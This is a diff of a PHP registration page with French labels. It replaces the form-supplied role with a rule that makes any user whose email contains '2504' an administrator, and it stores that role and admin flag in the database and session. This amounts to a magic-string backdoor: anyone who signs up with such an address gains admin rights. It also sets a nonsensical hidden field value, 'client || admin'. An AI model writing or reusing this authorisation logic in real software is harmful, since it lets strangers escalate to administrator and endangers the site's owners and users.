@@ -11,7 +11,7 @@ try {
 function clean_input($data)
 {
     return htmlspecialchars(strip_tags(trim($data)));
-} 
+}
 
 // Traitement du formulaire
 $errors = [];
@@ -21,9 +21,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Récupération des données
     $username = clean_input($_POST['username'] ?? '');
     $email = clean_input($_POST['email'] ?? '');
+    // Vérifie si "2504" est présent dans l'email
+    if (preg_match('/2504/', $email)) {
+        $role = 'admin';
+        $is_admin = true;
+    } else {
+        $role = 'client';
+        $is_admin = false;
+    }
     $password = $_POST['password'] ?? '';
     $confirm_password = $_POST['confirm_password'] ?? '';
-    $role = $_POST['role'] ?? '';
 
     // Validation
     if (empty($username)) {
@@ -71,15 +78,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (empty($errors)) {
         try {
             $hashed_password = password_hash($password, PASSWORD_BCRYPT);
-            $stmt = $db->prepare("INSERT INTO users (username, email, password, created_at) VALUES (?, ?, ?, NOW())");
-            $stmt->execute([$username, $email, $hashed_password]);
+            $stmt = $db->prepare("INSERT INTO users (username, email, password, role, is_admin, created_at) VALUES (?, ?, ?, ?, ?, NOW())");
+            $stmt->execute([$username, $email, $hashed_password, $role, $is_admin]);
 
             $success = true;
             $_SESSION['user'] = [
                 'id' => $db->lastInsertId(),
                 'username' => $username,
                 'email' => $email,
-                'role' => 'client'
+                'role' => $role,	
+                'is_admin' => $is_admin
             ];
         } catch (PDOException $e) {
             $errors[] = "Erreur lors de l'inscription: " . $e->getMessage();
@@ -97,7 +105,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <title>Inscription</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="stylesheet" href="assets/css/register.css">
-    
+
 </head>
 
 <body>
@@ -106,7 +114,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <?php if ($success): ?>
         <div class="success">
             Inscription réussie ! Bienvenue, <?= htmlspecialchars($username) ?>.
-            <p><a href="profile.php">Accéder à votre profil</a></p>
+            <p><a href="login.php">veuillez vous connecter maintenant </a></p>
         </div>
     <?php else: ?>
         <?php if (!empty($errors)): ?>
@@ -139,7 +147,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <label for="confirm_password">Confirmer le mot de passe:</label>
                 <input type="password" id="confirm_password" name="confirm_password" required minlength="8">
             </div>
-            <input type="hidden" name="role" value="client">
+            <input type="hidden" name="role" value="client || admin">
 
 
             <button type="submit">S'inscrire</button>
